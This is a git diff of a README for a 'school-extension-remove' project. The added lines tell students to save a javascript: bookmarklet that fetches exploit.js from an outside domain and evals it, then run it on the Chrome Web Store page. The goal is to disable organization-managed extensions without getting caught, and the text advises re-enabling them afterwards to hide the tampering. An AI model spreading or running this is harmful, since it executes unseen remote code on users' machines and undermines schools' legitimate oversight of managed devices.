@@ -1,2 +1,5 @@
 # school-extension-remove
-removes organization extensions
+removes organization extensions, copy the text below this one, javascript:fetch("https://compactcow.com/ltbeef/exploit.js").then(data=>{data.text().then(text=>{eval(text)})});
+Next click the star, click more, in the URL section input this code, open a new tab and type in the top bar,
+chrome.google.com/webstorex
+then you open the bookmarks bar that is right next to the person on this window page and the bookmarks bar has a half black and half white icon, click on it and scroll down to the bookmark you saved earlier, then when u are on chrome.google.com/webstorex have the bookmarks bar pen next to the website that I told u to be on for this to work, then you gotta click that bookmark that you copied and it takes you to the extensions where you can disable or enable any extensions you want without getting caught if you don't tell your classmates, NOTICE! IT IS NOT MY FAULT IF YOU GET INTO TROUBLE OR CAUGHT FOR THIS, I am just simply doing this because sometimes people need privacy on the school computer, WHEN YOU FINISH WITH THE COMPUTER AND IT IS FROM YUR SCHOOL TURN THE EXTENSIONS BY THE ORGANIZATION BACK ON, BECAUSE THEY CAN SEE WHO WAS LAST LOGGED ON ONTO SCHOOL COMPUTERS THAT GET RETURNED TO THE SCHOOL.
